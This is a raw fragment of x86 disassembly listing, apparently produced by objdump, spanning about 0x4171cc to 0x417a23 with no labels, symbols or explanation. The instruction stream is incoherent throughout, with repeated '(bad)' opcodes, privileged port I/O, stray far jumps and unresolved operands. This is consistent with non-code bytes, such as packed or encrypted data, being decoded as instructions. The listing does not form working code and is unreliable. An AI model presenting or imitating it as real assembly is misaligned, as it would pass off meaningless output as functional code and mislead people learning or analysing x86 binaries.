  4171cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171cd:	cs push es
  4171cf:	out    0x49,al
  4171d1:	sti    
  4171d2:	les    eax,FWORD PTR [ebx]
  4171d4:	daa    
  4171d5:	dec    ecx
  4171d6:	jge    0x417204
  4171d8:	add    ah,BYTE PTR [esi+0x3e]
  4171db:	stc    
  4171dc:	sbb    bl,bh
  4171de:	enter  0x494a,0x26
  4171e2:	xor    eax,0x5262ea4d
  4171e7:	pop    ebp
  4171e8:	pop    eax
  4171e9:	fs inc ecx
  4171eb:	inc    esp
  4171ec:	and    DWORD PTR [ebx+0x530d6044],ecx
  4171f2:	jge    0x4171ea
  4171f4:	std    
  4171f5:	rcr    BYTE PTR [ebx],cl
  4171f7:	jo     0x417276
  4171f9:	jbe    0x41721a
  4171fb:	mov    ebx,DWORD PTR [esi]
  4171fd:	(bad)  
  4171fe:	rol    ch,1
  417200:	adc    BYTE PTR [edi-0xe8b6f97],0xea
  417207:	dec    edx
  417208:	xchg   esi,eax
  417209:	cmp    al,0x40
  41720b:	and    al,0x44
  41720d:	cmp    edi,edi
  41720f:	jnp    0x417237
  417211:	nop
  417212:	xor    bh,dl
  417214:	push   DWORD PTR [ebx-0x778d711c]
  41721a:	cmp    eax,0xe9f4030a
  41721f:	or     BYTE PTR es:[esi+ebp*8+0x5a],0x3a
  417225:	sbb    cl,ah
  417227:	cs pop ss
  417229:	push   0x6e34b614
  41722e:	je     0x4172ac
  417230:	call   0x82ea801e
  417235:	xchg   ebx,eax
  417236:	dec    esi
  417237:	cmp    DWORD PTR [eax+ebp*1+0x1d9ef661],ebp
  41723e:	sbb    al,0x5e
  417240:	mov    bl,0x1c
  417242:	lds    edi,FWORD PTR [edi]
  417244:	xlat   BYTE PTR ds:[ebx]
  417245:	adc    DWORD PTR [ebx],edx
  417247:	cmp    DWORD PTR [esi+0x10],esi
  41724a:	out    dx,al
  41724b:	aad    0x83
  41724d:	mov    DWORD PTR ds:0x80f42b56,ebx
  417253:	data16 xlat BYTE PTR ds:[ebx]
  417255:	loope  0x417288
  417257:	jo     0x417203
  417259:	mov    ah,0x90
  41725b:	fcmove st,st(6)
  41725d:	jecxz  0x417213
  41725f:	mov    esi,0x771e3af3
  417264:	lods   eax,DWORD PTR ds:[esi]
  417265:	ror    DWORD PTR [edx],1
  417267:	imul   eax,eax,0x88a4b269
  41726d:	neg    cl
  41726f:	ror    DWORD PTR [ebx-0x6336badd],0x11
  417276:	dec    ecx
  417277:	sar    BYTE PTR [edi+0x57],1
  41727a:	inc    esi
  41727b:	gs jae 0x41729f
  41727e:	test   eax,0x24a22d3c
  417283:	repnz sub DWORD PTR [edi-0x40a63c34],ebp
  41728a:	and    DWORD PTR [edi+0x33],ebx
  41728d:	call   0xca496348
  417292:	(bad)
  417296:	jno    0x4172ae
  417298:	rcl    DWORD PTR [edi+ecx*8-0x7f48ab45],1
  41729f:	dec    esp
  4172a0:	imul   ecx,DWORD PTR ds:0x5e9e8893,0x41
  4172a7:	in     eax,0x6c
  4172a9:	and    esp,DWORD PTR [ebx+edi*4]
  4172ac:	test   DWORD PTR [eax],edi
  4172ae:	mov    eax,0x4118343c
  4172b3:	push   ebp
  4172b4:	adc    BYTE PTR [ebx+0x3d97199e],bl
  4172ba:	arpl   WORD PTR [esi+0xe],bx
  4172bd:	xor    DWORD PTR ds:0x4879921a,ebx
  4172c3:	fldcw  WORD PTR [ecx-0x713c6a2b]
  4172c9:	in     eax,dx
  4172ca:	pushf  
  4172cb:	test   DWORD PTR gs:[esi],ecx
  4172ce:	test   al,0xca
  4172d0:	mov    WORD PTR ds:0xdd47b31,ds
  4172d6:	leave  
  4172d7:	stos   BYTE PTR es:[edi],al
  4172d8:	cmp    eax,0xb299c9bd
  4172dd:	push   edx
  4172de:	sub    al,0x2e
  4172e0:	and    ecx,eax
  4172e2:	pop    ecx
  4172e3:	jnp    0x417303
  4172e5:	icebp  
  4172e6:	adc    ebx,edx
  4172e8:	scas   eax,DWORD PTR es:[edi]
  4172e9:	push   ss
  4172ea:	mov    edi,0xb2051ea8
  4172ef:	jp     0x417354
  4172f1:	xor    al,0x41
  4172f3:	pop    ebp
  4172f4:	bswap  eax
  4172f6:	xlat   BYTE PTR ds:[ebx]
  4172f7:	pop    es
  4172f8:	xchg   ah,bl
  4172fa:	add    DWORD PTR [ecx-0x48],edi
  4172fd:	push   es
  4172fe:	push   esi
  4172ff:	and    eax,0xe96d9de8
  417304:	aas    
  417305:	push   0x20879f07
  41730a:	add    al,0x33
  41730c:	push   0xffffff83
  41730e:	jb     0x4172e4
  417310:	enter  0xd9d3,0x2c
  417314:	ins    DWORD PTR es:[edi],dx
  417315:	fidivr WORD PTR [ebp-0x391ce5a3]
  41731b:	idiv   BYTE PTR [eax-0x165d0c21]
  417321:	xor    al,0x2a
  417323:	dec    edi
  417324:	cli    
  417325:	jb     0x41732d
  417327:	(bad)  
  417328:	sbb    al,0xb9
  41732a:	xchg   ecx,eax
  41732b:	lea    edx,[ebp+0x77]
  41732e:	aas    
  41732f:	jne    0x417317
  417331:	xor    al,0x7c
  417333:	retf   0xd399
  417336:	inc    ebp
  417337:	mov    ch,0x1e
  417339:	push   ebp
  41733a:	clc    
  41733b:	repz dec ebp
  41733d:	mov    dl,0xf1
  41733f:	mov    eax,0x36be234d
  417344:	scas   eax,DWORD PTR es:[edi]
  417345:	push   esi
  417346:	mov    WORD PTR [ecx-0x66],cs
  417349:	adc    ebx,0xd9746308
  41734f:	ins    DWORD PTR es:[edi],dx
  417350:	jae    0x41731a
  417352:	jmp    0xb77cfefc
  417357:	jno    0x4173ce
  417359:	and    bh,al
  41735b:	mov    edi,0x8f990cd3
  417360:	(bad)  
  417361:	dec    ebp
  417362:	sub    al,BYTE PTR [edi+0x1eed4a9a]
  417368:	sar    BYTE PTR [eax-0x14d0560c],cl
  41736e:	mov    ch,al
  417370:	xchg   esi,eax
  417371:	(bad)  
  417372:	pop    ds
  417373:	cmp    eax,0x4b8bdb4e
  417378:	out    0xfb,al
  41737a:	imul   edx,DWORD PTR [edi+0x25b06b77],0x6
  417381:	in     eax,dx
  417382:	mov    eax,DWORD PTR [edx+0x6]
  417385:	inc    edi
  417386:	or     DWORD PTR [ecx-0x6f814323],0x348c39
  417390:	add    eax,0xa243f166
  417395:	mov    BYTE PTR [edx+edx*2+0x27e165ec],ch
  41739c:	sbb    al,BYTE PTR [edi+0x5f7fbd3c]
  4173a2:	push   ebx
  4173a3:	or     eax,0x5c81d7a7
  4173a8:	cld    
  4173a9:	or     eax,0x612c59f0
  4173ae:	and    bh,BYTE PTR [esi]
  4173b0:	fsubr  st,st(0)
  4173b2:	out    dx,eax
  4173b3:	pusha  
  4173b4:	lods   eax,DWORD PTR es:[esi]
  4173b6:	or     al,0x8a
  4173b8:	(bad)  
  4173b9:	adc    bh,dh
  4173bb:	adc    eax,0x7607059a
  4173c0:	fcomp  DWORD PTR gs:[ebp+ecx*2+0x36242647]
  4173c8:	mov    dh,BYTE PTR [edx-0x2260eaa3]
  4173ce:	add    BYTE PTR [edi+0x3ae3da8e],cl
  4173d4:	call   0xae99:0xb51fb7ac
  4173db:	fwait
  4173dc:	pop    es
  4173dd:	je     0x41743b
  4173df:	xor    al,0x58
  4173e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173e2:	shl    BYTE PTR [eax+edx*8-0x69],1
  4173e6:	jmp    0x41737c
  4173e8:	xor    eax,0xea0bc3c9
  4173ed:	pop    edi
  4173ee:	lods   al,BYTE PTR ds:[esi]
  4173ef:	stos   BYTE PTR es:[edi],al
  4173f0:	fs out 0xbe,eax
  4173f3:	xchg   ebx,eax
  4173f4:	popa   
  4173f5:	mov    esi,ebx
  4173f7:	mov    bl,0x70
  4173f9:	pop    ebx
  4173fa:	pushf  
  4173fb:	int3   
  4173fc:	cli    
  4173fd:	or     esp,edi
  4173ff:	add    bh,BYTE PTR [edx-0x6b6e86b3]
  417405:	cmp    esp,DWORD PTR [eax-0x6afde28b]
  41740b:	(bad)  
  41740c:	and    BYTE PTR [edi+0x59cdbe54],ah
  417412:	add    DWORD PTR [ecx+edx*4-0x13],eax
  417416:	scas   eax,DWORD PTR es:[edi]
  417417:	test   eax,0xa0272264
  41741c:	retf   
  41741d:	xchg   ebx,eax
  41741e:	push   esi
  41741f:	jno    0x4173ac
  417421:	xor    BYTE PTR [ebp-0x2e4f25e2],dh
  417427:	js     0x417450
  417429:	xchg   edi,eax
  41742a:	(bad)  
  41742c:	lods   al,BYTE PTR ds:[esi]
  41742d:	mov    edi,0xceec960c
  417432:	gs nop
  417434:	or     BYTE PTR [esi+0x4283e819],dh
  41743a:	pop    edi
  41743b:	xchg   esi,eax
  41743c:	and    al,0x4d
  41743e:	jno    0x417433
  417440:	ins    BYTE PTR es:[edi],dx
  417441:	pop    edi
  417442:	xchg   ebp,eax
  417443:	xchg   BYTE PTR [eax],bl
  417445:	add    edx,eax
  417447:	inc    ebp
  417448:	(bad)  
  417449:	mov    ds:0x9d00b29f,al
  41744e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41744f:	outs   dx,DWORD PTR ds:[esi]
  417450:	retf   0xd1c8
  417453:	lahf   
  417454:	neg    DWORD PTR [edi]
  417456:	repnz (bad) 
  417459:	sub    BYTE PTR [edi-0x28],ah
  41745c:	xor    DWORD PTR [esi+ebx*8-0x3d],ecx
  417460:	jge    0x417492
  417462:	adc    eax,0xf671be89
  417467:	test   edx,esi
  417469:	rcr    BYTE PTR [edi],cl
  41746b:	push   ecx
  41746c:	push   cs
  41746d:	jmp    DWORD PTR [ebx+0x49]
  417470:	sub    al,0xde
  417472:	fcomp  QWORD PTR [eax+0x4b569f93]
  417478:	mov    dl,0x3d
  41747a:	pop    edx
  41747b:	call   0xeea4:0x4a19f1b8
  417482:	pop    ebx
  417483:	pushf  
  417484:	inc    esp
  417485:	and    BYTE PTR [ecx+ebx*4+0x3b],al
  417489:	test   BYTE PTR [esi+0x21],bl
  41748c:	outs   dx,BYTE PTR ds:[esi]
  41748d:	enter  0x7939,0x9e
  417491:	pusha  
  417492:	xor    esi,0x63
  417495:	push   esi
  417496:	jo     0x417459
	...
  417514:	aad    0x80
  417516:	pusha  
  417517:	cld    
  417518:	jne    0x417516
  41751a:	(bad)  [ecx+0x32bc8e94]
  417520:	inc    ebx
  417521:	cld    
  417522:	hlt    
  417523:	adc    eax,0x1184d
  417528:	ins    BYTE PTR es:[edi],dx
  417529:	pop    es
  41752a:	add    BYTE PTR [eax],al
  41752c:	push   esi
  41752d:	clc    
  41752e:	aam    0xe6
  417530:	fisttp QWORD PTR [edi+ecx*1+0x5b]
  417534:	push   edx
  417535:	stos   DWORD PTR es:[edi],eax
  417536:	pusha  
  417537:	js     0x41759d
  417539:	jecxz  0x4174ca
  41753b:	inc    ecx
  41753c:	push   cs
  41753d:	sub    eax,0xddccab24
  417542:	into   
  417543:	icebp  
  417544:	push   0xaf4864de
  417549:	xor    BYTE PTR [ebx-0x4f55351c],0x66
  417550:	sbb    edi,edi
  417552:	jmp    0x417540
  417554:	stc    
  417555:	mov    ebx,0xd7596c6b
  41755a:	out    0xfc,eax
  41755c:	ret    
  41755d:	inc    ebp
  41755e:	cmp    bl,BYTE PTR [edi-0x57]
  417561:	leave  
  417562:	icebp  
  417563:	scas   al,BYTE PTR es:[edi]
  417564:	adc    eax,0x831bc50d
  417569:	pop    esp
  41756a:	xor    DWORD PTR [ebx],eax
  41756c:	xlat   BYTE PTR ds:[ebx]
  41756d:	icebp  
  41756e:	fisttp WORD PTR [ecx+ebx*1+0x58]
  417572:	xor    DWORD PTR [esi-0x60],edi
  417575:	or     al,0xd
  417577:	add    bh,BYTE PTR [edi-0x39]
  41757a:	cmp    ecx,ebp
  41757c:	add    al,0x30
  41757e:	lods   eax,DWORD PTR ds:[esi]
  41757f:	cmp    DWORD PTR [eax+0xaa03320],ecx
  417585:	push   esp
  417586:	outs   dx,BYTE PTR ds:[esi]
  417587:	stos   DWORD PTR es:[edi],eax
  417588:	xchg   ecx,eax
  417589:	lea    ebp,[ecx]
  41758b:	sbb    ebp,ebp
  41758d:	xor    DWORD PTR [edx+0x764e6c8],eax
  417593:	retf   0xfc75
  417596:	sbb    al,0x2e
  417598:	mov    WORD PTR [esp+ebp*1+0x7f34b195],cs
  41759f:	cmp    eax,0x10310054
  4175a4:	aaa    
  4175a5:	mov    al,ds:0x3c766826
  4175aa:	cwde   
  4175ab:	ins    DWORD PTR es:[edi],dx
  4175ac:	fidivr WORD PTR [ecx+0x1c27e3]
  4175b2:	pop    eax
  4175b3:	in     eax,0xec
  4175b5:	test   eax,0x1a67697f
  4175ba:	dec    esp
  4175bb:	or     ebx,edx
  4175bd:	fdiv   DWORD PTR [ebp+0x30]
  4175c0:	popf   
  4175c1:	js     0x4175db
  4175c3:	fdivr  st,st(4)
  4175c5:	pop    esi
  4175c6:	ror    BYTE PTR [ebp+0x60103c75],0x1a
  4175cd:	mov    ds:0x89508a3a,al
  4175d2:	mov    esi,0x44bdb950
  4175d7:	mov    ch,0x95
  4175d9:	ins    BYTE PTR es:[edi],dx
  4175da:	data16 loop 0x4175de
  4175dd:	pop    esi
  4175de:	jns    0x41759b
  4175e0:	dec    ebx
  4175e1:	cli    
  4175e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175e3:	and    BYTE PTR [ecx-0x555d8e54],dl
  4175e9:	inc    BYTE PTR [eax]
  4175eb:	inc    eax
  4175ec:	inc    esi
  4175ed:	stos   DWORD PTR es:[edi],eax
  4175ee:	fmul   QWORD PTR [edi+0x9]
  4175f1:	loope  0x417603
  4175f3:	loopne 0x417667
  4175f5:	jnp    0x417636
  4175f7:	adc    edx,eax
  4175f9:	xrstor [ecx+0x2b88f6c3]
  417600:	push   esp
  417601:	mov    dh,0x2f
  417603:	dec    edx
  417604:	cmp    DWORD PTR [edx+0x685d2421],esp
  41760a:	xor    al,0xad
  41760c:	daa    
  41760d:	dec    ebx
  41760e:	adc    al,0x9a
  417610:	cmp    edi,edi
  417612:	les    ebp,FWORD PTR [esi]
  417614:	sbb    eax,0x544d04d8
  417619:	inc    ebp
  41761a:	and    edx,DWORD PTR [eax+ecx*4-0x29]
  41761e:	cwde   
  41761f:	nop
  417620:	cld    
  417621:	fild   DWORD PTR [ebx+0x6e760ace]
  417627:	cmp    eax,ecx
  417629:	pusha  
  41762a:	fistp  DWORD PTR [ebx]
  41762c:	and    DWORD PTR [ebx-0x7f6e41e5],ebx
  417632:	(bad)  
  417633:	push   0xffffffeb
  417635:	xor    al,0x79
  417637:	mul    BYTE PTR cs:0x2cea2e4e
  41763e:	xor    BYTE PTR [edi+0x57],ch
  417641:	mov    eax,0x98a85406
  417646:	sub    edi,esp
  417648:	pop    esi
  417649:	(bad)  
  41764a:	lock cmp DWORD PTR [ebx-0x66],eax
  41764e:	ins    BYTE PTR es:[edi],dx
  41764f:	jp     0x41761d
  417651:	inc    ecx
  417652:	push   esp
  417653:	cmp    BYTE PTR [ebp+0x19bcf5b0],bh
  417659:	sbb    dh,BYTE PTR [esi-0x79]
  41765c:	inc    edx
  41765d:	std    
  41765e:	test   al,0x86
  417660:	leave  
  417661:	sahf   
  417662:	push   esp
  417663:	and    edi,ebx
  417665:	dec    esp
  417666:	dec    ecx
  417667:	xchg   edi,eax
  417668:	and    ebp,eax
  41766a:	jecxz  0x4176dd
  41766c:	or     BYTE PTR [ebx],0xf0
  41766f:	xlat   BYTE PTR ds:[ebx]
  417670:	push   es
  417671:	inc    ebx
  417672:	add    al,BYTE PTR ds:0x64247985
  417678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417679:	mov    ah,0x82
  41767b:	data16 mov dh,0xe3
  41767e:	iret   
  41767f:	mov    ch,BYTE PTR [esi]
  417681:	fild   DWORD PTR [edx]
  417683:	xor    DWORD PTR [edx+0x22],esp
  417686:	dec    edx
  417687:	pop    esi
  417688:	xor    DWORD PTR [ecx+0x67],edx
  41768b:	pop    ds
  41768c:	call   0xe0a6325d
  417691:	adc    ebx,DWORD PTR [ecx+0x6e]
  417694:	push   esp
  417695:	mov    ch,0xc7
  417697:	sub    dl,BYTE PTR [ebx]
  417699:	cmp    BYTE PTR [esi-0x20],dh
  41769c:	fistp  DWORD PTR ds:0x360ca0ab
  4176a2:	js     0x417722
  4176a4:	popa   
  4176a5:	sub    eax,0x8598d660
  4176aa:	xchg   ecx,eax
  4176ab:	cmp    edi,0xc4cc4f65
  4176b1:	call   0x97b1:0x58abb075
  4176b8:	(bad)  
  4176b9:	mov    ebp,0xc3943187
  4176be:	popa   
  4176bf:	mov    WORD PTR ds:0xb8d8e5e4,ss
  4176c5:	or     al,0x14
  4176c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176c8:	and    bh,BYTE PTR [ebx+ecx*8]
  4176cb:	jle    0x417683
  4176cd:	das    
  4176ce:	push   esi
  4176cf:	shr    BYTE PTR [esi+0x7e],cl
  4176d2:	jns    0x417734
  4176d4:	call   0xf2681c7
  4176d9:	pop    ebx
  4176da:	jnp    0x4176ca
  4176dc:	pop    ds
  4176dd:	stos   BYTE PTR es:[edi],al
  4176de:	in     al,dx
  4176df:	scas   al,BYTE PTR es:[edi]
  4176e0:	fwait
  4176e1:	outs   dx,BYTE PTR ds:[esi]
  4176e2:	push   es
  4176e3:	add    al,0xb3
  4176e5:	mov    WORD PTR [edx],?
  4176e7:	outs   dx,BYTE PTR ds:[esi]
  4176e8:	adc    bh,BYTE PTR [ebp+0x6402b75e]
  4176ee:	adc    dl,BYTE PTR [edi]
  4176f0:	scas   eax,DWORD PTR es:[edi]
  4176f1:	shl    esi,cl
  4176f3:	or     al,0x68
  4176f5:	cld    
  4176f6:	gs out dx,al
  4176f8:	inc    ebx
  4176f9:	clc    
  4176fa:	inc    edi
  4176fb:	add    al,0xf7
  4176fd:	jo     0x417752
  4176ff:	add    eax,0x756cf9fe
  417704:	repnz or eax,DWORD PTR [ecx+0x64]
  417708:	js     0x417690
  41770a:	aad    0x41
  41770c:	push   cs
  41770d:	mov    bh,0xe1
  41770f:	add    cl,dh
  417711:	pop    es
  417712:	lea    edx,[edi-0x74]
  417715:	test   al,0x65
  417717:	and    DWORD PTR [ebx+0x4504c69e],ebp
  41771d:	sbb    eax,0x9671addf
  417722:	cli    
  417723:	icebp  
  417724:	fimul  WORD PTR [esi+ebp*2]
  417727:	(bad)  [esi]
  417729:	ss add al,0xf
  41772c:	adc    DWORD PTR [esi],edi
  41772e:	jmp    0xff5e:0x1d252cb9
  417735:	mov    es,WORD PTR [ebp+0x2f]
  417738:	mov    ch,0x8
  41773a:	or     eax,DWORD PTR [esi+0x24e8f568]
  417740:	pop    ecx
  417741:	ins    BYTE PTR es:[edi],dx
  417742:	cmp    eax,DWORD PTR [ecx+edi*2]
  417745:	push   0x9140ed2b
  41774a:	dec    BYTE PTR [ebx]
  41774c:	sahf   
  41774d:	(bad)  
  41774f:	js     0x417740
  417751:	pushf  
  417752:	int3   
  417753:	test   ecx,esi
  417755:	and    ah,BYTE PTR [edi+0x2b]
  417758:	imul   ebp,DWORD PTR [ebx],0x99367fa7
  41775e:	nop
  41775f:	dec    edx
  417760:	nop
  417761:	mov    ds:0x3c9fe795,al
  417766:	push   ebx
  417767:	jnp    0x417797
  417769:	mov    eax,DWORD PTR [edi+0x5264d9c1]
  41776f:	push   edi
  417770:	dec    esi
  417771:	mov    edi,0x7ff528da
  417776:	push   ecx
  417777:	ds sahf 
  417779:	in     al,dx
  41777a:	mov    edx,0x4cfd4d9b
  41777f:	pusha  
  417780:	ja     0x4177f0
  417782:	mov    bh,0x9a
  417784:	test   al,0x21
  417786:	push   edx
  417787:	js     0x4177c6
  417789:	mov    WORD PTR [esp+eax*2+0x682b7580],?
  417790:	loop   0x417766
  417792:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417794:	and    al,0xf1
  417796:	mov    esp,0x41c01508
  41779b:	imul   edi,ecx,0x985c5136
  4177a1:	lods   eax,DWORD PTR ds:[esi]
  4177a2:	rol    BYTE PTR fs:[edi+0x30c9c37f],0xad
  4177aa:	cmc    
  4177ab:	lahf   
  4177ac:	jg     0x4177a6
  4177ae:	pusha  
  4177af:	dec    eax
  4177b0:	out    dx,al
  4177b1:	pusha  
  4177b2:	dec    ebp
  4177b3:	ret    0xa8c8
  4177b6:	and    eax,0x85ff5bb2
  4177bb:	adc    BYTE PTR [edx+0x3f],bh
  4177be:	fmul   DWORD PTR [eax+0x329ea0a6]
  4177c4:	or     esp,DWORD PTR [ebp-0x29760839]
  4177ca:	mov    bl,0xc5
  4177cc:	xchg   DWORD PTR [ebx-0x23251b30],esp
  4177d2:	push   ds
  4177d3:	xchg   edi,eax
  4177d4:	adc    BYTE PTR [ebp+esi*8+0x36],0xf1
  4177d9:	imul   edi,DWORD PTR [edi],0xffffffcc
  4177dc:	(bad)  
  4177dd:	push   edi
  4177de:	adc    ebx,ebp
  4177e0:	sbb    ch,dl
  4177e2:	cld    
  4177e3:	pop    ecx
  4177e4:	sub    ah,al
  4177e6:	sbb    DWORD PTR cs:[eax+esi*2-0x2c25932],ebp
  4177ee:	icebp  
  4177ef:	inc    ebp
  4177f0:	and    eax,0xa294591c
  4177f5:	cmp    DWORD PTR cs:[edi+esi*8+0x29],ebp
  4177fa:	out    0x67,al
  4177fc:	cmp    eax,0x66018632
  417801:	push   cs
  417802:	inc    ecx
  417803:	mov    BYTE PTR [ebx],0x8
  417806:	fist   WORD PTR [esi-0x6c8a8bc6]
  41780c:	jecxz  0x4177a2
  41780e:	inc    esp
  41780f:	mov    BYTE PTR [edi],ah
  417811:	sbb    eax,0x166f603b
  417816:	mov    edi,0xb275d494
  41781b:	xchg   edi,eax
  41781c:	cs jae 0x4177d8
  41781f:	mov    ebp,0x7361db98
  417824:	int    0x5
  417826:	dec    edx
  417827:	mov    BYTE PTR [ebp-0x2fbabcb7],ah
  41782d:	callw  0x102d
  417831:	mov    ecx,0x11b5c678
  417836:	xchg   ebp,eax
  417837:	mov    ch,0x74
  417839:	pusha  
  41783a:	sub    cl,ah
  41783c:	mov    esi,0xf89e5a2
  417841:	and    al,cl
  417843:	outs   dx,DWORD PTR ds:[esi]
  417844:	daa    
  417845:	xchg   DWORD PTR [ecx],edx
  417847:	add    DWORD PTR [edi-0x54201a2e],edx
  41784d:	mov    edi,0x9e08d232
  417852:	xor    BYTE PTR [edi],bh
  417854:	push   ds
  417855:	xchg   ecx,eax
  417856:	bound  esi,QWORD PTR [eax-0x46]
  417859:	jb     0x417840
  41785b:	jl     0x41785f
  41785d:	mov    ah,0xa2
  41785f:	(bad)  
  417860:	xor    BYTE PTR [esi],0x74
  417863:	cmc    
  417864:	lahf   
  417865:	xor    eax,0xa43f865b
  41786a:	pushf  
  41786b:	inc    ebx
  41786c:	mov    dl,0x7c
  41786e:	in     eax,dx
  41786f:	std    
  417870:	inc    ebx
  417871:	arpl   WORD PTR [ecx],di
  417873:	scas   eax,DWORD PTR es:[edi]
  417874:	repz mov cl,0xbd
  417877:	icebp  
  417878:	dec    eax
  417879:	adc    ebx,ebp
  41787b:	push   ds
  41787c:	ss push edi
  41787e:	and    esi,DWORD PTR [ecx-0x3b]
  417881:	cwde   
  417882:	(bad)  
  417883:	sub    cl,BYTE PTR [edx]
  417885:	(bad)  
  417886:	out    dx,al
  417887:	cwde   
  417888:	xchg   ebx,eax
  417889:	lds    edi,FWORD PTR [edi-0x7d97c360]
  41788f:	mov    esp,0x74ecfbfb
  417894:	push   es
  417895:	mov    eax,0x2ad19aa5
  41789a:	add    bl,ah
  41789c:	test   edx,edx
  41789e:	into   
  41789f:	or     ah,bl
  4178a1:	scas   al,BYTE PTR es:[edi]
  4178a2:	inc    edx
  4178a3:	pop    ebx
  4178a4:	pop    ecx
  4178a5:	je     0x417898
  4178a7:	sbb    bl,BYTE PTR [ebx]
  4178a9:	in     al,dx
  4178aa:	inc    eax
  4178ab:	aad    0xf9
  4178ad:	lods   al,BYTE PTR ds:[esi]
  4178ae:	push   ebx
  4178af:	cmp    al,0xb6
  4178b1:	pop    esp
  4178b2:	into   
  4178b3:	(bad)  
  4178b5:	and    BYTE PTR [esi+0x1d1a7419],0x88
  4178bc:	imul   BYTE PTR [ebx-0x24]
  4178bf:	cmp    dh,BYTE PTR [ecx]
  4178c1:	cld    
  4178c2:	mov    ebp,0x1a66316b
  4178c7:	adc    eax,0x15b5f2ba
  4178cc:	mov    esp,esp
  4178ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178cf:	sbb    DWORD PTR [ebp-0x4f],0x3d
  4178d3:	sbb    eax,0x7bc44527
  4178d8:	call   0xd9d274d6
  4178dd:	jg     0x417937
  4178df:	les    edx,FWORD PTR [ebx+0x74544a8a]
  4178e5:	inc    ecx
  4178e6:	xor    BYTE PTR [edx+ebx*2+0x348cce13],cl
  4178ed:	inc    eax
  4178ee:	jbe    0x4178c3
  4178f0:	mov    edx,0x903d33a6
  4178f5:	(bad)  
  4178f6:	sub    BYTE PTR [eax+0x71],0x8f
  4178fa:	out    dx,al
  4178fb:	stos   DWORD PTR es:[edi],eax
  4178fc:	(bad)  
  4178fd:	lock mov esp,0x5887a1a2
  417903:	inc    edi
  417904:	jmp    0x417959
  417906:	retf   
  417907:	cdq    
  417908:	adc    DWORD PTR [eax-0x4d887cff],0x5c37eb23
  417912:	pushf  
  417913:	fsubp  st(3),st
  417915:	pop    ebx
  417917:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  417919:	sbb    al,dh
  41791b:	or     bl,BYTE PTR [ebx]
  41791d:	das    
  41791e:	push   ss
  41791f:	inc    ecx
  417920:	clc    
  417921:	shr    DWORD PTR [ebx+0x79d28218],0xa
  417928:	cld    
  417929:	sub    BYTE PTR [ebp+0x0],ah
  41792c:	shr    ah,cl
  41792e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41792f:	or     eax,0x7c8da410
  417934:	into   
  417935:	pushf  
  417936:	pop    edi
  417937:	cs mov esp,0x7ae56240
  41793d:	cmp    BYTE PTR [ebp+0x28],bl
  417940:	inc    ebx
  417941:	cwde   
  417942:	jmp    0x627c:0xb5081817
  417949:	and    al,0x78
  41794b:	push   eax
  41794c:	cmp    ah,BYTE PTR [edx+0x292accd]
  417952:	dec    esi
  417953:	out    dx,al
  417954:	adc    al,0xd6
  417956:	jb     0x41792e
  417958:	std    
  417959:	imul   esi,edx,0xd0f9d21
  41795f:	push   ecx
  417960:	or     DWORD PTR [esi],ebx
  417962:	dec    edi
  417963:	jne    0x4179bc
  417965:	dec    edi
  417966:	sub    DWORD PTR [edi],0xe3461a43
  41796c:	sub    BYTE PTR [edx],ch
  41796e:	cli    
  41796f:	(bad)  [ebx]
  417971:	sub    DWORD PTR [edi],esp
  417973:	jmp    0xc14260bb
  417978:	inc    edx
  417979:	xor    al,0xa1
  41797b:	fstp   DWORD PTR ds:0x10aaaa1
  417981:	aaa    
  417982:	bound  ebx,QWORD PTR [esi-0x6e]
  417985:	dec    ebp
  417986:	arpl   WORD PTR [ebx+0x65819f4b],dx
  41798c:	icebp  
  41798d:	mov    BYTE PTR [esp+edi*2+0x2533400a],0x80
  417995:	sub    ebp,0xffffffe7
  417998:	jle    0x4179a4
  41799a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41799b:	or     DWORD PTR ds:0x99cae3cf,edx
  4179a1:	xor    eax,0x9aa6ad7a
  4179a6:	test   al,0xe3
  4179a8:	arpl   WORD PTR [edi],cx
  4179aa:	outs   dx,DWORD PTR ds:[esi]
  4179ab:	ja     0x417a0a
  4179ad:	dec    edx
  4179ae:	mov    ebx,0x41fe1d71
  4179b3:	inc    eax
  4179b4:	mov    DWORD PTR [ebx+0x365f79a6],ebx
  4179ba:	xchg   ebp,eax
  4179bb:	pop    ebx
  4179bc:	addr16 pop eax
  4179be:	xchg   edx,eax
  4179bf:	push   ds
  4179c0:	push   esp
  4179c1:	leave  
  4179c2:	pop    ax
  4179c4:	inc    edx
  4179c5:	retf   
  4179c6:	scas   al,BYTE PTR es:[edi]
  4179c7:	fisubr WORD PTR [ebx]
  4179c9:	fimul  DWORD PTR [eax]
  4179cb:	jmp    0xe16:0x1d7fcdf7
  4179d2:	or     DWORD PTR [edi-0x3e],eax
  4179d5:	mov    ebp,0xcb35da30
  4179da:	mov    eax,ds:0x3bf1ca18
  4179df:	jmp    DWORD PTR [ecx]
  4179e1:	jnp    0x4179ab
  4179e3:	jae    0x417a37
  4179e5:	sub    al,bl
  4179e7:	mov    dh,BYTE PTR [ecx]
  4179e9:	daa    
  4179ea:	fdivr  st,st(6)
  4179ec:	mov    ebx,0x292077fe
  4179f1:	das    
  4179f2:	mov    edx,0x7de258e6
  4179f7:	ins    DWORD PTR es:[edi],dx
  4179f8:	jno    0x417a40
  4179fa:	pushf  
  4179fb:	mov    bl,0xe5
  4179fd:	(bad)  
  4179fe:	repz retf 
  417a00:	push   cs
  417a01:	push   ebx
  417a02:	aam    0x1a
  417a04:	inc    esp
  417a05:	jg     0x417a1a
  417a07:	(bad)  
  417a08:	in     al,dx
  417a09:	inc    ebp
  417a0a:	lods   al,BYTE PTR ds:[esi]
  417a0b:	fs xchg ecx,eax
  417a0d:	sub    BYTE PTR [eax],bl
  417a0f:	jmp    0x955d:0xb866af2a
  417a16:	invd   
  417a18:	and    esi,DWORD PTR [edx-0x2d8d19d6]
  417a1e:	adc    al,0x16
  417a20:	push   es
  417a21:	cwde   
  417a22:	iret   
  417a23:	inc    edi
